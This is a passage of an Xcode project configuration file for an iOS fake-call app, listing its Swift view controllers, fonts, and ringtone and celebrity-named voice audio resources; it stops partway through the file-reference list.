// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 56;
	objects = {

/* Begin PBXBuildFile section */
		040894CA2BBE771F00B343F1 /* ContactDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 040894C92BBE771F00B343F1 /* ContactDetailsVC.swift */; };
		04116FE32BEA0E2F004CBB41 /* Torch.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04116FE22BEA0E2E004CBB41 /* Torch.swift */; };
		0411AA7A2BE8CF2300E977EE /* AFWrepper.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0411AA792BE8CF2300E977EE /* AFWrepper.swift */; };
		041215F22C06E79600E90B86 /* Chalet.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215ED2C06E79500E90B86 /* Chalet.wav */; };
		041215F32C06E79600E90B86 /* Arpeggio.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215EE2C06E79500E90B86 /* Arpeggio.wav */; };
		041215F42C06E79600E90B86 /* Canopy.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215EF2C06E79600E90B86 /* Canopy.wav */; };
		041215F52C06E79600E90B86 /* Breaking.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215F02C06E79600E90B86 /* Breaking.wav */; };
		041215F62C06E79600E90B86 /* Chirp.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215F12C06E79600E90B86 /* Chirp.wav */; };
		041215FC2C06E7A200E90B86 /* Daybreak.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215F72C06E7A100E90B86 /* Daybreak.wav */; };
		041215FD2C06E7A200E90B86 /* Dollop.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215F82C06E7A100E90B86 /* Dollop.wav */; };
		041215FE2C06E7A200E90B86 /* Original-iPhone-ring-1.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215F92C06E7A200E90B86 /* Original-iPhone-ring-1.wav */; };
		041215FF2C06E7A200E90B86 /* iPhone14.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215FA2C06E7A200E90B86 /* iPhone14.wav */; };
		041216002C06E7A200E90B86 /* Kettle.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041215FB2C06E7A200E90B86 /* Kettle.wav */; };
		041216042C06E7AE00E90B86 /* Redmi_note_6.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216012C06E7AE00E90B86 /* Redmi_note_6.wav */; };
		041216052C06E7AE00E90B86 /* Reflection.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216022C06E7AE00E90B86 /* Reflection.wav */; };
		041216062C06E7AE00E90B86 /* Romantic_ringtone.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216032C06E7AE00E90B86 /* Romantic_ringtone.wav */; };
		0412160C2C06EA0700E90B86 /* Donald Trump.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216072C06EA0600E90B86 /* Donald Trump.wav */; };
		0412160D2C06EA0700E90B86 /* Barack Obama.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216082C06EA0600E90B86 /* Barack Obama.wav */; };
		0412160E2C06EA0700E90B86 /* Angelina jolie.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216092C06EA0600E90B86 /* Angelina jolie.wav */; };
		0412160F2C06EA0700E90B86 /* Elon Musk.wav in Resources */ = {isa = PBXBuildFile; fileRef = 0412160A2C06EA0600E90B86 /* Elon Musk.wav */; };
		041216102C06EA0700E90B86 /* Cristiano Ronaldo.wav in Resources */ = {isa = PBXBuildFile; fileRef = 0412160B2C06EA0700E90B86 /* Cristiano Ronaldo.wav */; };
		041216162C06EA1100E90B86 /* Kylie Jen.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216112C06EA1000E90B86 /* Kylie Jen.wav */; };
		041216172C06EA1100E90B86 /* Love male.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216122C06EA1000E90B86 /* Love male.wav */; };
		041216182C06EA1100E90B86 /* Sarukh khan.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216132C06EA1000E90B86 /* Sarukh khan.wav */; };
		041216192C06EA1100E90B86 /* The Rock.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216142C06EA1000E90B86 /* The Rock.wav */; };
		0412161A2C06EA1100E90B86 /* Love.wav in Resources */ = {isa = PBXBuildFile; fileRef = 041216152C06EA1000E90B86 /* Love.wav */; };
		0412161E2C06EA1A00E90B86 /* Unknown.wav in Resources */ = {isa = PBXBuildFile; fileRef = 0412161B2C06EA1900E90B86 /* Unknown.wav */; };
		0412161F2C06EA1A00E90B86 /* Work.wav in Resources */ = {isa = PBXBuildFile; fileRef = 0412161C2C06EA1900E90B86 /* Work.wav */; };
		041216202C06EA1A00E90B86 /* Zenda.wav in Resources */ = {isa = PBXBuildFile; fileRef = 0412161D2C06EA1900E90B86 /* Zenda.wav */; };
		041570012BD65D9400BB3A76 /* RingtoneVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 041570002BD65D9400BB3A76 /* RingtoneVC.swift */; };
		042653592BEA2C22000A332E /* VibrationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042653582BEA2C22000A332E /* VibrationManager.swift */; };
		0429328B2BFDA81F00209726 /* AdMob.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0429328A2BFDA81E00209726 /* AdMob.swift */; };
		0446BC132BCFA62C006F9487 /* ContactGellaryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0446BC122BCFA62C006F9487 /* ContactGellaryVC.swift */; };
		044AFD732BC3C37A00D43187 /* WallpaperVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 044AFD722BC3C37A00D43187 /* WallpaperVC.swift */; };
		044AFD772BC3D4B600D43187 /* ChooseWallpaperVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 044AFD762BC3D4B600D43187 /* ChooseWallpaperVC.swift */; };
		045139292BD7722C00E88DE3 /* ThemeOneVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045139282BD7722C00E88DE3 /* ThemeOneVC.swift */; };
		0451392B2BD7812600E88DE3 /* DuringCallThemeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0451392A2BD7812600E88DE3 /* DuringCallThemeVC.swift */; };
		0458D6002BCCF5580009FE3E /* Core Data.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0458D5FF2BCCF5570009FE3E /* Core Data.swift */; };
		04683DC92BC109F900CAA1BA /* CallerIdVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04683DC82BC109F900CAA1BA /* CallerIdVC.swift */; };
		046B0C242BD1262400D1B61F /* SF-Pro-Text-Heavy.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C122BD1262100D1B61F /* SF-Pro-Text-Heavy.otf */; };
		046B0C272BD1262400D1B61F /* SF-Pro-Text-Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C152BD1262200D1B61F /* SF-Pro-Text-Medium.otf */; };
		046B0C292BD1262400D1B61F /* SF-Pro-Text-Semibold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C172BD1262200D1B61F /* SF-Pro-Text-Semibold.otf */; };
		046B0C2D2BD1262400D1B61F /* SF-Pro-Text-Thin.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C1B2BD1262300D1B61F /* SF-Pro-Text-Thin.otf */; };
		046B0C302BD1262400D1B61F /* SF-Pro-Text-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C1E2BD1262300D1B61F /* SF-Pro-Text-Regular.otf */; };
		046B0C322BD1262400D1B61F /* SF-Pro-Text-Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C202BD1262400D1B61F /* SF-Pro-Text-Bold.otf */; };
		046B0C412BD12A5500D1B61F /* SF-Pro-Rounded-Semibold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C382BD12A5400D1B61F /* SF-Pro-Rounded-Semibold.otf */; };
		046B0C432BD12A5500D1B61F /* SF-Pro-Rounded-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C3A2BD12A5400D1B61F /* SF-Pro-Rounded-Regular.otf */; };
		046B0C442BD12A5500D1B61F /* SF-Pro-Rounded-Heavy.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C3B2BD12A5500D1B61F /* SF-Pro-Rounded-Heavy.otf */; };
		046B0C462BD12A5500D1B61F /* SF-Pro-Rounded-Thin.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C3D2BD12A5500D1B61F /* SF-Pro-Rounded-Thin.otf */; };
		046B0C482BD12A5500D1B61F /* SF-Pro-Rounded-Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C3F2BD12A5500D1B61F /* SF-Pro-Rounded-Bold.otf */; };
		046B0C582BD130B900D1B61F /* SFMono-Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C4C2BD130B800D1B61F /* SFMono-Bold.otf */; };
		046B0C592BD130B900D1B61F /* SFMono-Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C4D2BD130B800D1B61F /* SFMono-Light.otf */; };
		046B0C5A2BD130B900D1B61F /* SFMono-Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C4E2BD130B800D1B61F /* SFMono-Medium.otf */; };
		046B0C5D2BD130B900D1B61F /* SFMono-Heavy.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C512BD130B800D1B61F /* SFMono-Heavy.otf */; };
		046B0C602BD130B900D1B61F /* SFMono-Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C542BD130B900D1B61F /* SFMono-Regular.otf */; };
		046B0C612BD130B900D1B61F /* SFMono-Semibold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C552BD130B900D1B61F /* SFMono-Semibold.otf */; };
		046B0C702BD142C200D1B61F /* PlayfairDisplay-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C642BD142C000D1B61F /* PlayfairDisplay-ExtraBold.ttf */; };
		046B0C712BD142C200D1B61F /* PlayfairDisplay-ExtraBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C652BD142C000D1B61F /* PlayfairDisplay-ExtraBoldItalic.ttf */; };
		046B0C722BD142C200D1B61F /* PlayfairDisplay-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C662BD142C000D1B61F /* PlayfairDisplay-Regular.ttf */; };
		046B0C732BD142C200D1B61F /* PlayfairDisplay-BlackItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C672BD142C000D1B61F /* PlayfairDisplay-BlackItalic.ttf */; };
		046B0C742BD142C200D1B61F /* PlayfairDisplay-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C682BD142C000D1B61F /* PlayfairDisplay-Black.ttf */; };
		046B0C752BD142C200D1B61F /* PlayfairDisplay-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C692BD142C100D1B61F /* PlayfairDisplay-BoldItalic.ttf */; };
		046B0C762BD142C200D1B61F /* PlayfairDisplay-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C6A2BD142C100D1B61F /* PlayfairDisplay-Italic.ttf */; };
		046B0C772BD142C200D1B61F /* PlayfairDisplay-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C6B2BD142C100D1B61F /* PlayfairDisplay-SemiBold.ttf */; };
		046B0C782BD142C200D1B61F /* PlayfairDisplay-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C6C2BD142C100D1B61F /* PlayfairDisplay-MediumItalic.ttf */; };
		046B0C792BD142C200D1B61F /* PlayfairDisplay-SemiBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C6D2BD142C100D1B61F /* PlayfairDisplay-SemiBoldItalic.ttf */; };
		046B0C7A2BD142C200D1B61F /* PlayfairDisplay-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C6E2BD142C100D1B61F /* PlayfairDisplay-Medium.ttf */; };
		046B0C7B2BD142C200D1B61F /* PlayfairDisplay-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 046B0C6F2BD142C100D1B61F /* PlayfairDisplay-Bold.ttf */; };
		046D83242BDCB3D1004A846D /* ThemeTwoVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 046D83232BDCB3D1004A846D /* ThemeTwoVC.swift */; };
		046D83262BDCB6F0004A846D /* MTSlideToOpenView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 046D83252BDCB6F0004A846D /* MTSlideToOpenView.swift */; };
		046D83292BDCD355004A846D /* TimerVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 046D83282BDCD355004A846D /* TimerVC.swift */; };
		0480C3C02BE26046009BB9F7 /* FirstPremiumSubscriptionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0480C3BF2BE26046009BB9F7 /* FirstPremiumSubscriptionVC.swift */; };
		048C42A02BDF63EA00EEDAEB /* Modal.swift in Sources */ = {isa = PBXBuildFile; fileRef = 048C429F2BDF63EA00EEDAEB /* Modal.swift */; };
		048C8E992BE389C900942E1C /* primiumVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 048C8E982BE389C900942E1C /* primiumVC.swift */; };
		0492EB712BE514D600543FF9 /* TheameThreeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0492EB702BE514D600543FF9 /* TheameThreeVC.swift */; };
		049466662BBED36C00A5F432 /* VoiceVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 049466652BBED36C00A5F432 /* VoiceVC.swift */; };
		049FE2252BFF43790017597D /* Device.swift in Sources */ = {isa = PBXBuildFile; fileRef = 049FE2242BFF43790017597D /* Device.swift */; };
		04C42C192BBD0F8D00130100 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C182BBD0F8D00130100 /* AppDelegate.swift */; };
		04C42C1B2BBD0F8D00130100 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C1A2BBD0F8D00130100 /* SceneDelegate.swift */; };
		04C42C1D2BBD0F8D00130100 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C1C2BBD0F8D00130100 /* HomeVC.swift */; };
		04C42C202BBD0F8D00130100 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04C42C1E2BBD0F8D00130100 /* Main.storyboard */; };
		04C42C232BBD0F8D00130100 /* Fake_Call.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C212BBD0F8D00130100 /* Fake_Call.xcdatamodeld */; };
		04C42C252BBD0F8E00130100 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04C42C242BBD0F8E00130100 /* Assets.xcassets */; };
		04C42C282BBD0F8E00130100 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04C42C262BBD0F8E00130100 /* LaunchScreen.storyboard */; };
		04C42C312BBD177300130100 /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C302BBD177300130100 /* Extension.swift */; };
		04C42C352BBD1CF300130100 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C332BBD1CF200130100 /* Constants.swift */; };
		04C42C362BBD1CF300130100 /* Utils.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C342BBD1CF300130100 /* Utils.swift */; };
		04C42C392BBD1F5A00130100 /* Created URL.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C382BBD1F5900130100 /* Created URL.swift */; };
		04C42C3D2BBD61D200130100 /* OnBoadingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C3C2BBD61D200130100 /* OnBoadingVC.swift */; };
		04C42C402BBD69B200130100 /* Setting VC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C42C3F2BBD69B200130100 /* Setting VC.swift */; };
		04C9EDD52BE0B6C000742982 /* On Boadrding.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04C9EDD42BE0B6BF00742982 /* On Boadrding.storyboard */; };
		04C9EDD72BE1165400742982 /* FeedBackVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C9EDD62BE1165400742982 /* FeedBackVC.swift */; };
		04C9EDD92BE1168200742982 /* OfferVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C9EDD82BE1168200742982 /* OfferVC.swift */; };
		04C9EDDB2BE1169F00742982 /* NotificationVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04C9EDDA2BE1169F00742982 /* NotificationVC.swift */; };
		04D4CDF92BC798ED00A22ED7 /* CallThemeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D4CDF82BC798ED00A22ED7 /* CallThemeVC.swift */; };
		04E7D4572BC5055200A99F75 /* RecodingVoiceVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04E7D4562BC5055200A99F75 /* RecodingVoiceVC.swift */; };
		04E82ACA2BCFEBF500D7B8E4 /* TextEditVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04E82AC92BCFEBF400D7B8E4 /* TextEditVC.swift */; };
		04F6F5E72C0987A900BEC2CC /* popPremiumVc.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04F6F5E62C0987A900BEC2CC /* popPremiumVc.swift */; };
		04FCA5942BE36733005255E7 /* SecondSubscriptionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04FCA5932BE36733005255E7 /* SecondSubscriptionVC.swift */; };
		57B0EAC42DFF35CD0036A329 /* Color.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 57B0EAC32DFF35CD0036A329 /* Color.xcassets */; };
		6F3AEDC7F3D9EE0E1150FABF /* Pods_Fake_Call.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 777C42E4D06BC7CCC70FE492 /* Pods_Fake_Call.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		040894C92BBE771F00B343F1 /* ContactDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactDetailsVC.swift; sourceTree = "<group>"; };
		04116FE22BEA0E2E004CBB41 /* Torch.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Torch.swift; sourceTree = "<group>"; };
		0411AA792BE8CF2300E977EE /* AFWrepper.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AFWrepper.swift; sourceTree = "<group>"; };
		041215ED2C06E79500E90B86 /* Chalet.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Chalet.wav; sourceTree = "<group>"; };
		041215EE2C06E79500E90B86 /* Arpeggio.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Arpeggio.wav; sourceTree = "<group>"; };
		041215EF2C06E79600E90B86 /* Canopy.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Canopy.wav; sourceTree = "<group>"; };
		041215F02C06E79600E90B86 /* Breaking.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Breaking.wav; sourceTree = "<group>"; };
		041215F12C06E79600E90B86 /* Chirp.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Chirp.wav; sourceTree = "<group>"; };
		041215F72C06E7A100E90B86 /* Daybreak.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Daybreak.wav; sourceTree = "<group>"; };
		041215F82C06E7A100E90B86 /* Dollop.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Dollop.wav; sourceTree = "<group>"; };
		041215F92C06E7A200E90B86 /* Original-iPhone-ring-1.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "Original-iPhone-ring-1.wav"; sourceTree = "<group>"; };
		041215FA2C06E7A200E90B86 /* iPhone14.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = iPhone14.wav; sourceTree = "<group>"; };
		041215FB2C06E7A200E90B86 /* Kettle.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Kettle.wav; sourceTree = "<group>"; };
		041216012C06E7AE00E90B86 /* Redmi_note_6.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Redmi_note_6.wav; sourceTree = "<group>"; };
		041216022C06E7AE00E90B86 /* Reflection.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Reflection.wav; sourceTree = "<group>"; };
		041216032C06E7AE00E90B86 /* Romantic_ringtone.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Romantic_ringtone.wav; sourceTree = "<group>"; };
		041216072C06EA0600E90B86 /* Donald Trump.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "Donald Trump.wav"; sourceTree = "<group>"; };
		041216082C06EA0600E90B86 /* Barack Obama.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "Barack Obama.wav"; sourceTree = "<group>"; };
		041216092C06EA0600E90B86 /* Angelina jolie.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "Angelina jolie.wav"; sourceTree = "<group>"; };
		0412160A2C06EA0600E90B86 /* Elon Musk.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "Elon Musk.wav"; sourceTree = "<group>"; };
		0412160B2C06EA0700E90B86 /* Cristiano Ronaldo.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "Cristiano Ronaldo.wav"; sourceTree = "<group>"; };
		041216112C06EA1000E90B86 /* Kylie Jen.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "Kylie Jen.wav"; sourceTree = "<group>"; };
		041216122C06EA1000E90B86 /* Love male.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "Love male.wav"; sourceTree = "<group>"; };
		041216132C06EA1000E90B86 /* Sarukh khan.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "Sarukh khan.wav"; sourceTree = "<group>"; };
		041216142C06EA1000E90B86 /* The Rock.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = "The Rock.wav"; sourceTree = "<group>"; };
		041216152C06EA1000E90B86 /* Love.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Love.wav; sourceTree = "<group>"; };
		0412161B2C06EA1900E90B86 /* Unknown.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Unknown.wav; sourceTree = "<group>"; };
		0412161C2C06EA1900E90B86 /* Work.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Work.wav; sourceTree = "<group>"; };
		0412161D2C06EA1900E90B86 /* Zenda.wav */ = {isa = PBXFileReference; lastKnownFileType = audio.wav; path = Zenda.wav; sourceTree = "<group>"; };
		041570002BD65D9400BB3A76 /* RingtoneVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RingtoneVC.swift; sourceTree = "<group>"; };
		042653582BEA2C22000A332E /* VibrationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VibrationManager.swift; sourceTree = "<group>"; };
		0429328A2BFDA81E00209726 /* AdMob.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AdMob.swift; sourceTree = "<group>"; };
		0446BC122BCFA62C006F9487 /* ContactGellaryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactGellaryVC.swift; sourceTree = "<group>"; };
		044AFD722BC3C37A00D43187 /* WallpaperVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WallpaperVC.swift; sourceTree = "<group>"; };
		044AFD762BC3D4B600D43187 /* ChooseWallpaperVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChooseWallpaperVC.swift; sourceTree = "<group>"; };
		045139282BD7722C00E88DE3 /* ThemeOneVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ThemeOneVC.swift; sourceTree = "<group>"; };
		0451392A2BD7812600E88DE3 /* DuringCallThemeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DuringCallThemeVC.swift; sourceTree = "<group>"; };
		0458D5FF2BCCF5570009FE3E /* Core Data.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "Core Data.swift"; sourceTree = "<group>"; };
		04683DC82BC109F900CAA1BA /* CallerIdVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CallerIdVC.swift; sourceTree = "<group>"; };
		046B0C122BD1262100D1B61F /* SF-Pro-Text-Heavy.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Heavy.otf"; sourceTree = "<group>"; };
		046B0C152BD1262200D1B61F /* SF-Pro-Text-Medium.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Medium.otf"; sourceTree = "<group>"; };
		046B0C172BD1262200D1B61F /* SF-Pro-Text-Semibold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Semibold.otf"; sourceTree = "<group>"; };
		046B0C1B2BD1262300D1B61F /* SF-Pro-Text-Thin.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Thin.otf"; sourceTree = "<group>"; };
		046B0C1E2BD1262300D1B61F /* SF-Pro-Text-Regular.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Regular.otf"; sourceTree = "<group>"; };
		046B0C202BD1262400D1B61F /* SF-Pro-Text-Bold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Text-Bold.otf"; sourceTree = "<group>"; };
		046B0C382BD12A5400D1B61F /* SF-Pro-Rounded-Semibold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Rounded-Semibold.otf"; sourceTree = "<group>"; };
		046B0C3A2BD12A5400D1B61F /* SF-Pro-Rounded-Regular.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Rounded-Regular.otf"; sourceTree = "<group>"; };
		046B0C3B2BD12A5500D1B61F /* SF-Pro-Rounded-Heavy.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Rounded-Heavy.otf"; sourceTree = "<group>"; };
		046B0C3D2BD12A5500D1B61F /* SF-Pro-Rounded-Thin.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Rounded-Thin.otf"; sourceTree = "<group>"; };
		046B0C3F2BD12A5500D1B61F /* SF-Pro-Rounded-Bold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SF-Pro-Rounded-Bold.otf"; sourceTree = "<group>"; };
		046B0C4C2BD130B800D1B61F /* SFMono-Bold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SFMono-Bold.otf"; sourceTree = "<group>"; };
		046B0C4D2BD130B800D1B61F /* SFMono-Light.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SFMono-Light.otf"; sourceTree = "<group>"; };
		046B0C4E2BD130B800D1B61F /* SFMono-Medium.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SFMono-Medium.otf"; sourceTree = "<group>"; };
		046B0C512BD130B800D1B61F /* SFMono-Heavy.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SFMono-Heavy.otf"; sourceTree = "<group>"; };
		046B0C542BD130B900D1B61F /* SFMono-Regular.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SFMono-Regular.otf"; sourceTree = "<group>"; };
		046B0C552BD130B900D1B61F /* SFMono-Semibold.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "SFMono-Semibold.otf"; sourceTree = "<group>"; };
		046B0C642BD142C000D1B61F /* PlayfairDisplay-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-ExtraBold.ttf"; sourceTree = "<group>"; };
		046B0C652BD142C000D1B61F /* PlayfairDisplay-ExtraBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-ExtraBoldItalic.ttf"; sourceTree = "<group>"; };
		046B0C662BD142C000D1B61F /* PlayfairDisplay-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-Regular.ttf"; sourceTree = "<group>"; };
		046B0C672BD142C000D1B61F /* PlayfairDisplay-BlackItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-BlackItalic.ttf"; sourceTree = "<group>"; };
		046B0C682BD142C000D1B61F /* PlayfairDisplay-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-Black.ttf"; sourceTree = "<group>"; };
		046B0C692BD142C100D1B61F /* PlayfairDisplay-BoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-BoldItalic.ttf"; sourceTree = "<group>"; };
		046B0C6A2BD142C100D1B61F /* PlayfairDisplay-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-Italic.ttf"; sourceTree = "<group>"; };
		046B0C6B2BD142C100D1B61F /* PlayfairDisplay-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-SemiBold.ttf"; sourceTree = "<group>"; };
		046B0C6C2BD142C100D1B61F /* PlayfairDisplay-MediumItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "PlayfairDisplay-MediumItalic.ttf"; sourceTree = "<group>"; };
